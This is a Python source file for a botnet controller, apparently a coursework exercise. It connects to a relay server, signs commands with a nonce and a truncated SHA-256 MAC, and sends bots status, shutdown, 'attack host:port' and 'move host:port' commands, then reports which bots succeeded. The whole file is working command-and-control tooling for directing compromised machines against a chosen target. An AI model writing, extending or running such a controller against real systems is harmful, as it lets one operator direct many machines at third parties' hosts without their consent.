import argparse
import socket
import time
from cryptography.hazmat.primitives import hashes
import signal
import sys
import random
import time

# timeout to wait for bot responses
timeout = 5

# handle ctrl c
def signal_handler(sig, frame):
    print(' exiting...')
    sys.exit(0)

# generate a random nonce up to the system maximum int
def generate_random_nonce():
    return random.randint(0, sys.maxsize)

# generate a mac from the given nonce and secret
def generate_mac(nonce, secret):
    sha256_hash = hashes.Hash(hashes.SHA256())
    sha256_hash.update((f'{nonce}{secret}').encode())
    return sha256_hash.finalize().hex()[:8]

def parse_args():
    parser = argparse.ArgumentParser(
        prog='nccontroller',
        description='control',
    )
    parser.add_argument('hostname_and_port', help='hostname and port')
    parser.add_argument('secret', help='secret')
    return parser.parse_args()

# execute the status command
def execute_status_cmd(sock, cmd_msg):
    print("sending:", cmd_msg)
    sock.sendall(cmd_msg.encode())
    
    # store start time
    start_time = time.time()
    bots_discovered = []
    timed_out = False
    
    # loop until 5 seconds have passed or an exeception is encountered
    while time.time() < start_time + timeout and not timed_out:
        try:
            sock.settimeout(timeout)
            recv_msg = sock.recv(1024).decode('ascii').split()
            # check if the received message is a status message and store it
            if (len(recv_msg) == 3 and recv_msg[0] == '-status'):  
                bots_discovered.append(f'{recv_msg[1]} ({recv_msg[2]})')
                print("received: ", recv_msg[:])
        except socket.timeout:
            timed_out = True
        except Exception as e:
            print(e)
            timed_out = True
            
    # print results
    status_msg = f'\nResult: {len(bots_discovered)} bots discovered.\n    {bots_discovered[:]}'
    print(status_msg)
        
    return True

# execute the shutdown command
def execute_shutdown_cmd(sock, cmd_msg):
    print("sending:", cmd_msg)
    sock.sendall(cmd_msg.encode())
    
    # store start time
    start_time = time.time()
    bots = []
    timed_out = False
    
    # loop until 5 seconds have passed or an exeception is encountered
    while time.time() < start_time + timeout and not timed_out:
        try:
            sock.settimeout(5)
            recv_msg = sock.recv(1024).decode('ascii').split()
            # check if the received message is a shutdown message and store it
            if (len(recv_msg) == 2 and recv_msg[0] == '-shutdown'):    
                bots.append(f'{recv_msg[1]}')
                print("received: ", recv_msg[:])
        except socket.timeout:
            timed_out = True
        except Exception as e:
            print(e)
            timed_out = True
    
    msg = f'\nResult: {len(bots)} bots shut down.\n    {bots[:]}'
    print(msg)
        
    return True

def execute_attack_cmd(sock, cmd_msg):
    print("sending:", cmd_msg)
    sock.sendall(cmd_msg.encode())
    
    # store start time
    start_time = time.time()
    bots_ok = []
    bots_fail = []
    timed_out = False
    bots_res = ''
    
    # loop until 5 seconds have passed or an exeception is encountered
    while time.time() < start_time + timeout and not timed_out:
        try:
            sock.settimeout(5)
            recv_msg = sock.recv(1024).decode('ascii').split()
            print("received: ", recv_msg[:])
            # check if the received message is an attack message
            if (len(recv_msg) >= 3 and recv_msg[0] == '-attack'):   
                # check if message is OK or FAIL and store in the corresponding variables
                if recv_msg[2] == 'OK':
                    bots_ok.append(recv_msg[1]) 
                else: 
                    bots_res += f'{recv_msg[1]}:'
                    for m in recv_msg[3:]:
                        bots_res += ' ' + m
                    bots_res += '\n    '
                    bots_fail.append(recv_msg[1])
        except socket.timeout:
            timed_out = True
        except Exception as e:
            print(e)
            timed_out = True
            
    # print results
    msg = f'\nResult: {len(bots_ok)} bots attacked successfully.\n    {bots_ok[:]}\n{len(bots_fail)} failed to attack\n    {bots_res}'
    print(msg)
        
    return True

# execute the move command
def execute_move_cmd(sock, cmd_msg):
    print("sending:", cmd_msg)
    sock.sendall(cmd_msg.encode())
    
    # store start time
    start_time = time.time()
    bots_ok = []
    timed_out = False
    
    # loop until 5 seconds have passed or an exeception is encountered
    while time.time() < start_time + timeout and not timed_out:
        try:
            sock.settimeout(5)
            recv_msg = sock.recv(1024).decode('ascii').split()
            # check if the received message is a move message and store it
            print("received: ", recv_msg[:])
            if (len(recv_msg) >= 2 and recv_msg[0] == '-move'):    
                bots_ok.append(f'{recv_msg[1]}')
        except socket.timeout:
            timed_out = True
        except Exception as e:
            print(e)
            timed_out = True
    
    # print results
    msg = f'\nResult: {len(bots_ok)} bots moved.\n    {bots_ok[:]}\n'
    print(msg)
        
    return True

# execute the given command
def execute_cmd(user_input, sock, secret):
    cmd = user_input[0]
    # generate mac for the command
    nonce = generate_random_nonce()
    mac = generate_mac(nonce, secret)
    # create the command message to broadcast to the bots
    cmd_msg = f'{nonce} {mac} {cmd}\n'
    
    # matches the command to the appropriate function to execute it
    match cmd:
        case "status":
            return execute_status_cmd(sock, cmd_msg)
        case "shutdown":
            return execute_shutdown_cmd(sock, cmd_msg)
        case "attack":
            if len(user_input) != 2:
                print("incorrect args")
                return False
            elif len(user_input[1].split(':')) != 2:
                print("incorrect args")
                return False
            cmd_msg += f' {user_input[1]}\n'
            return execute_attack_cmd(sock, cmd_msg)
        case "move":
            if len(user_input) != 2:
                print("incorrect args")
                return False
            elif len(user_input[1].split(':')) != 2:
                print("incorrect args")
                return False
            cmd_msg += f' {user_input[1]}\n'
            return execute_move_cmd(sock, cmd_msg)
        case "quit":
            sock.close()
            print("Bye.")
            sys.exit()
        
    return False

# start the controller
def start_controller(hostname, port, secret):
    while(True): 
        try:
            # create the socket connection
            sock = socket.create_connection((hostname,port), timeout=30)
            print("Connected to", hostname, port)
            # send a join message
            join_msg = f'-joined CONTROLLER\n'
            sock.sendall(join_msg.encode())
            connected = True
            
            # loop until disconnected
            while (connected):
                # get user input
                user_input = input("cmd> ").split()
                if len(user_input) > 0:
                    # execute the given command
                    execute_cmd(user_input, sock, secret)
                # handle disconnection
                elif user_input == []:
                    connected = False
                    print('disconnected')
                else:
                    print("message ignored")
        except socket.timeout:
            print("Connection timed out. Attempting to reconnect...")
        except OSError as e:
            if e.errno == 9: # ignore
                pass
            else:
                print(e)
        except Exception as e:
            print(e)
        time.sleep(5)

def main():
    # handle ctrl c
    signal.signal(signal.SIGINT, signal_handler)
    args = parse_args()
    print(args.hostname_and_port)
    hostname, port = args.hostname_and_port.split(':')
    # start the controller
    start_controller(hostname, port, args.secret)
    
    
    
if __name__ == "__main__":
    main()